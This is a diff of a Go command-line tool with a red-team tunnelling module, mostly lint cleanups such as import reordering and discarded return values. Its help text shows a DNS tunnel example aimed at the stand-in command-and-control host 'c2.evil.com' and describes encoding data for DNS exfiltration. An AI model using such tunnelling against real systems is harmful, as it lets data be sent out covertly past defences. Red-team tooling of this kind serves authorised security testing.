@@ -4,9 +4,10 @@ import (
 	"fmt"
 	"os"
 	"os/signal"
+	"syscall"
+
 	"raxuiscli/cmd"
 	"raxuiscli/internal/redteam/tunnel"
-	"syscall"
 
 	"github.com/spf13/cobra"
 )
@@ -29,7 +30,7 @@ Examples:
   raxuiscli tunnel dns --domain c2.evil.com                 # DNS tunnel info
   raxuiscli tunnel encode "secret data" --method base64     # Encode for tunnel`,
 	Run: func(cmd *cobra.Command, args []string) {
-		cmd.Help()
+		_ = cmd.Help()
 	},
 }
 
@@ -62,7 +63,7 @@ Forwards traffic from a local port to a remote destination.`,
 		<-sigChan
 
 		fmt.Println("\nStopping proxy...")
-		proxy.Stop()
+		_ = proxy.Stop()
 	},
 }
 
@@ -101,7 +102,6 @@ Provides tools for encoding data for DNS exfiltration.`,
 	},
 }
 
-var tunnelEncodeInput string
 var tunnelEncodeMethod string
 
 var tunnelEncodeCmd = &cobra.Command{
